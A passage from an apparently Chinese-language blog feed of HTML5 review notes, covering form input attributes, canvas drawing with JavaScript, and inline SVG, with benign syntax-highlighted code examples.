class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>  <br></code></pre></div></td></tr></table></figure><h3 id="5-11-formtarget-属性（-lt-input-gt-）"><a href="#5-11-formtarget-属性（-lt-input-gt-）" class="headerlink" title="5.11 formtarget 属性（&lt;input&gt;）"></a>5.11 formtarget 属性（&lt;input&gt;）</h3><p>formtarget 属性指定一个名称或一个关键字来指明表单提交数据接收后的展示。formtarget 属性覆盖 &lt;form&gt;元素的target属性。formtarget 属性与type=”submit” 和 type=”image”配合使用。</p><p>使用实例：两个提交按钮的表单, 在不同窗口中显示</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as normal&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formtarget</span>=<span class="hljs-string">&quot;_blank&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit to a new window&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-12-height-和-width-属性（-lt-input-gt-）"><a href="#5-12-height-和-width-属性（-lt-input-gt-）" class="headerlink" title="5.12 height 和 width 属性（&lt;input&gt;）"></a>5.12 height 和 width 属性（&lt;input&gt;）</h3><p>height 和 width 属性规定用于 image 类型的 &lt;input&gt; 标签的图像高度和宽度。height 和 width 属性只适用于 image 类型的&lt;input&gt; 标签。</p><p>图像通常会同时指定高度和宽度属性。如果图像设置高度和宽度，图像所需的空间 在加载页时会被保留。如果没有这些属性， 浏览器不知道图像的大小，并不能预留 适当的空间。图片在加载过程中会使页面布局效果改变 （尽管图片已加载）。</p><p>使用实例：定义了一个图像提交按钮, 使用了 height 和 width 属性</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_submit.gif&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Submit&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;48&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;48&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-13-list-属性（-lt-input-gt-）"><a href="#5-13-list-属性（-lt-input-gt-）" class="headerlink" title="5.13 list 属性（&lt;input&gt;）"></a>5.13 list 属性（&lt;input&gt;）</h3><p>list 属性规定输入域的 datalist。datalist 是输入域的选项列表。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">list</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">datalist</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Internet Explorer&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firefox&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Chrome&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Opera&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Safari&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datalist</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-14-min-和-max-属性（-lt-input-gt-）"><a href="#5-14-min-和-max-属性（-lt-input-gt-）" class="headerlink" title="5.14 min 和 max 属性（&lt;input&gt;）"></a>5.14 min 和 max 属性（&lt;input&gt;）</h3><p>min、max 和 step 属性用于为包含数字或日期的 input 类型规定限定（约束）。</p><p>min、max 和 step 属性适用于以下类型的 &lt;input&gt; 标签：date pickers、number 以及 range。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Enter a date before 1980-01-01:<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;1979-12-31&quot;</span>&gt;</span><br><br>Enter a date after 2000-01-01:<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;2000-01-02&quot;</span>&gt;</span><br><br>Quantity (between 1 and 5):<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-15-multiple-属性（-lt-input-gt-）"><a href="#5-15-multiple-属性（-lt-input-gt-）" class="headerlink" title="5.15 multiple 属性（&lt;input&gt;）"></a>5.15 multiple 属性（&lt;input&gt;）</h3><p>multiple 属性是一个 boolean 属性。multiple 属性规定&lt;input&gt; 元素中可选择多个值。<br>multiple 属性适用于以下类型的&lt;input&gt; 标签：email 和 file。: email, and file.</p><p>使用实例：上传多个文件</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Select images: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;img&quot;</span> <span class="hljs-attr">multiple</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-16-pattern-属性（-lt-input-gt-）"><a href="#5-16-pattern-属性（-lt-input-gt-）" class="headerlink" title="5.16 pattern 属性（&lt;input&gt;）"></a>5.16 pattern 属性（&lt;input&gt;）</h3><p>pattern 属性描述了一个正则表达式用于验证&lt;input&gt; 元素的值。<br>pattern 属性适用于以下类型的&lt;input&gt; 标签: text, search, url, tel, email, 和 password.<br>是用来全局 title 属性描述了模式.</p><p>使用实例：显示一个只能包含三个字母的文本域（不含数字及特殊字符）</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Country code: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;country_code&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[A-Za-z]&#123;3&#125;&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Three letter country code&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-17-placeholder-属性（-lt-input-gt-）"><a href="#5-17-placeholder-属性（-lt-input-gt-）" class="headerlink" title="5.17 placeholder 属性（&lt;input&gt;）"></a>5.17 placeholder 属性（&lt;input&gt;）</h3><p>placeholder 属性提供一种提示（hint），描述输入域所期待的值。简短的提示在用户输入值前会显示在输入域上。</p><p>placeholder 属性适用于以下类型的&lt;input&gt; 标签：text, search, url, telephone, email 以及 password。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;First name&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-18-required-属性（-lt-input-gt-）"><a href="#5-18-required-属性（-lt-input-gt-）" class="headerlink" title="5.18  required 属性（&lt;input&gt;）"></a>5.18  required 属性（&lt;input&gt;）</h3><p>required 属性是一个 boolean 属性。required 属性规定必须在提交之前填写输入域（不能为空）。</p><p>required 属性适用于以下类型的&lt;input&gt; 标签：text, search, url, telephone, email, password, date pickers, number, checkbox, radio 以及 file。</p><p>使用实例：不能为空的input字段</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usrname&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-19-step-属性（-lt-input-gt-）"><a href="#5-19-step-属性（-lt-input-gt-）" class="headerlink" title="5.19 step 属性（&lt;input&gt;）"></a>5.19 step 属性（&lt;input&gt;）</h3><p>step 属性为输入域规定合法的数字间隔。如果 step=”3”，则合法的数是 -3,0,3,6 等。step 属性可以与 max 和 min 属性创建一个区域值。</p><p>step 属性与以下type类型一起使用: number, range, date, datetime, datetime-local, month, time 和 week。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;points&quot;</span> <span class="hljs-attr">step</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（二）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-lt-canvas-gt-元素"><a href="#1-lt-canvas-gt-元素" class="headerlink" title="1.&lt;canvas&gt;元素"></a>1.&lt;canvas&gt;元素</h2><p>&lt;canvas&gt;元素是HTML5中的新元素，通过使用该元素，你可以在网页中绘制所需的图形。标签定义图形，比如图表和其他图像，您必须使用脚本来绘制图形。通过脚本 (通常是JavaScript)来完成。标签只是图形容器，您必须使用脚本来绘制图形。可以通过多种方法使用Canva绘制路径,盒、圆、字符以及添加图像。可以在HTML页面中使用多个 &lt;canvas&gt; 元素.</p><h3 id="1-1-创建一个画布"><a href="#1-1-创建一个画布" class="headerlink" title="1.1 创建一个画布"></a>1.1 创建一个画布</h3><p>一个画布在网页中是一个矩形框，通过 &lt;canvas&gt; 元素来绘制。默认情况下 &lt;canvas&gt; 元素没有边框和内容。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>标签通常需要指定一个id属性 (脚本中经常引用), width 和 height 属性定义的画布的大小。</p><p><strong>使用style属性来添加边框：</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:1px solid #000000;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-使用JavaScript来绘制图像"><a href="#1-2-使用JavaScript来绘制图像" class="headerlink" title="1.2 使用JavaScript来绘制图像"></a>1.2 使用JavaScript来绘制图像</h3><p>canvas 元素本身是没有绘图能力的。所有的绘制工作必须在 JavaScript 内部完成。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="handlebars"><span class="xml">var c=document.getElementById(&quot;myCanvas&quot;); <span class="hljs-comment">&lt;!--第一步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">var ctx=c.getContext(&quot;2d&quot;); <span class="hljs-comment">&lt;!--第二步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">ctx.fillStyle=&quot;#FF0000&quot;; <span class="hljs-comment">&lt;!--第三步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">ctx.fillRect(0,0,150,75); <span class="hljs-comment">&lt;!--第四步--&gt;</span></span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><p><strong>代码解析</strong></p><blockquote><p>1.第一步为找到canvas元素。</p></blockquote><blockquote><p>2.第二步创建context对象。<br>getContext(“2d”) 对象是内建的 HTML5 对象，拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p></blockquote><blockquote><p>3.第三步和第四步是绘制一个红色的矩形。<br>设置fillStyle属性可以是CSS颜色，渐变，或图案。fillStyle默认设置是#000000（黑色）。<br>fillRect(x,y,width,height) 方法定义了矩形当前的填充方式。 </p></blockquote><h3 id="1-3-canvas坐标"><a href="#1-3-canvas坐标" class="headerlink" title="1.3 canvas坐标"></a>1.3 canvas坐标</h3><p>canvas 是一个二维网格。canvas 的左上角坐标为 (0,0)。<br>上面1.2中的 fillRect 方法拥有参数 (0,0,150,75)。意思是：在画布上绘制 150x75 的矩形，从左上角开始 (0,0)。</p><h3 id="1-4-canvas路径"><a href="#1-4-canvas路径" class="headerlink" title="1.4 canvas路径"></a>1.4 canvas路径</h3><p>在Canvas上画线，我们将使用以下两种方法：</p><blockquote><ul><li>moveTo(x,y) 定义线条开始坐标。</li></ul></blockquote><blockquote><ul><li>lineTo(x,y) 定义线条结束坐标。</li></ul></blockquote><p>绘制线条我们必须使用到 “ink” 的方法，就像stroke()。</p><p>使用实例：定义开始坐标(0,0), 和结束坐标 (200,100). 然后使用 stroke() 方法来绘制线条。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.moveTo(0,0);<br>ctx.lineTo(200,100);<br>ctx.stroke();<br></code></pre></div></td></tr></table></figure><p>在canvas中绘制圆形，可以这样用：</p><ul><li>arc(x,y,r,start,stop)</li></ul><p>实际上我们在绘制圆形时使用了 “ink” 的方法, 比如 stroke() 或者 fill()。</p><p>使用实例：使用 arc() 方法 绘制一个圆.var c=document.getElementById(“myCanvas”);<br>var ctx=c.getContext(“2d”);<br>ctx.beginPath();<br>ctx.arc(95,50,40,0,2*Math.PI);<br>ctx.stroke();</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.beginPath();<br>ctx.arc(95,50,40,0,2*Math.PI);<br>ctx.stroke();<br></code></pre></div></td></tr></table></figure><h3 id="1-5-canvas文本"><a href="#1-5-canvas文本" class="headerlink" title="1.5 canvas文本"></a>1.5 canvas文本</h3><p>使用 canvas 绘制文本，重要的属性和方法如下：</p><blockquote><ul><li>font：定义字体</li><li>fillText(text,x,y) ：在 canvas 上绘制实心的文本</li><li>strokeText(text,x,y)：在 canvas 上绘制空心的文本</li></ul></blockquote><h4 id="1-5-1-使用fillText"><a href="#1-5-1-使用fillText" class="headerlink" title="1.5.1 使用fillText()"></a>1.5.1 使用fillText()</h4><p>使用实例：使用 “Arial” 字体在画布上绘制一个高 30px 的文字（实心）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.font=&quot;30px Arial&quot;;<br>ctx.fillText(&quot;Hello World&quot;,10,50);<br></code></pre></div></td></tr></table></figure><h4 id="1-5-2-使用strokeText"><a href="#1-5-2-使用strokeText" class="headerlink" title="1.5.2 使用strokeText()"></a>1.5.2 使用strokeText()</h4><p>使用实例：使用 “Arial” 字体在画布上绘制一个高 30px 的文字（空心）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.font=&quot;30px Arial&quot;;<br>ctx.strokeText(&quot;Hello World&quot;,10,50);<br></code></pre></div></td></tr></table></figure><h3 id="1-6-canvas渐变"><a href="#1-6-canvas渐变" class="headerlink" title="1.6 canvas渐变"></a>1.6 canvas渐变</h3><p>渐变可以填充在矩形, 圆形, 线条, 文本等等, 各种形状可以自己定义不同的颜色。<br>有两种不同的方式来设置Canvas渐变：</p><blockquote><ul><li>createLinearGradient(x,y,x1,y1) ： 创建线条渐变</li><li>createRadialGradient(x,y,r,x1,y1,r1) ： 创建一个径向/圆渐变</li></ul></blockquote><p>当我们使用渐变对象，必须使用两种或两种以上的停止颜色。addColorStop()方法指定颜色停止，参数使用坐标来描述，可以是0至1。<br>使用渐变，设置fillStyle或strokeStyle的值为渐变，然后绘制形状，如矩形，文本，或一条线。</p><h4 id="1-6-1-使用-createLinearGradient"><a href="#1-6-1-使用-createLinearGradient" class="headerlink" title="1.6.1 使用 createLinearGradient()"></a>1.6.1 使用 createLinearGradient()</h4><p>使用实例：创建一个线性渐变。使用渐变填充矩形:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br><br>// Create gradient<br>var grd=ctx.createLinearGradient(0,0,200,0);<br>grd.addColorStop(0,&quot;red&quot;);<br>grd.addColorStop(1,&quot;white&quot;);<br><br>// Fill with gradient<br>ctx.fillStyle=grd;<br>ctx.fillRect(10,10,150,80);<br></code></pre></div></td></tr></table></figure><h4 id="1-6-2-使用-createRadialGradient"><a href="#1-6-2-使用-createRadialGradient" class="headerlink" title="1.6.2 使用 createRadialGradient()"></a>1.6.2 使用 createRadialGradient()</h4><p>使用实例：创建一个径向/圆渐变。使用渐变填充矩形：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br><br>// Create gradient<br>var grd=ctx.createRadialGradient(75,50,5,90,60,100);<br>grd.addColorStop(0,&quot;red&quot;);<br>grd.addColorStop(1,&quot;white&quot;);<br><br>// Fill with gradient<br>ctx.fillStyle=grd;<br>ctx.fillRect(10,10,150,80);<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>当使用&lt;canvas&gt;元素创建径向渐变的时候 context.createRadialGradient(x , y , r , x1 , y1 , r1) 括号内的参数有如下的含义:</p><blockquote><ul><li> x：表示渐变的开始圆的 x 坐标</li><li> y：表示渐变的开始圆的 y 坐标</li><li> r：表示开始圆的半径</li><li> x1：表示渐变的结束圆的 x 坐标</li><li>  y1：表示渐变的结束圆的 y 坐标</li><li> r1：表示结束圆的半径</li></ul></blockquote><h3 id="1-7-canvas图像"><a href="#1-7-canvas图像" class="headerlink" title="1.7 canvas图像"></a>1.7 canvas图像</h3><p>把一幅图像放置到画布上, 使用方法drawImage(image,x,y)。<br>使用实例：把一幅图像放置到画布上:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>var img=document.getElementById(&quot;scream&quot;);<br>ctx.drawImage(img,10,10);<br></code></pre></div></td></tr></table></figure><h2 id="2-内联SVG"><a href="#2-内联SVG" class="headerlink" title="2.内联SVG"></a>2.内联SVG</h2><p>SVG表示可缩放矢量图形，是基于可扩展标记语言（标准通用标记语言的子集），用于描述二维矢量图形的一种图形格式，它在2003年1月14日成为W3C推荐标准。</p><h3 id="2-1-什么是SVG"><a href="#2-1-什么是SVG" class="headerlink" title="2.1 什么是SVG"></a>2.1 什么是SVG</h3><p>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)， 用于定义用于网络的基于矢量的图形， 使用 XML 格式定义图形， 图像在放大或改变尺寸的情况下其图形质量不会有损失， 是万维网联盟的标准，SVG 与 DOM 和 XSL 之类的 W3C 标准是一个整体。</p><h3 id="2-2-SVG优势"><a href="#2-2-SVG优势" class="headerlink" title="2.2 SVG优势"></a>2.2 SVG优势</h3><p>与其他图像格式相比（比如 JPEG 和 GIF），使用 SVG 的优势在于：</p><ul><li>SVG 图像可通过文本编辑器来创建和修改</li><li>SVG 图像可被搜索、索引、脚本化或压缩</li><li>SVG 是可伸缩的</li><li>SVG 图像可在任何的分辨率下被高质量地打印</li><li>SVG 可在图像质量不下降的情况下被放大</li></ul><h3 id="2-3-SVG直接嵌入HTML页面"><a href="#2-3-SVG直接嵌入HTML页面" class="headerlink" title="2.3 SVG直接嵌入HTML页面"></a>2.3 SVG直接嵌入HTML页面</h3><p>在 HTML5 中，能够将 SVG 元素直接嵌入 HTML 页面中：</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;190&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;100,10 40,180 190,60 10,60 160,180&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-SVG与canvas的区别"><a href="#2-4-SVG与canvas的区别" class="headerlink" title="2.4 SVG与canvas的区别"></a>2.4 SVG与canvas的区别</h3><p>SVG 是一种使用 XML 描述 2D 图形的语言。</p><p>Canvas 通过 JavaScript 来绘制 2D 图形。</p><p>SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。</p><p>在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p><p>Canvas 是逐像素进行渲染的。在 canvas 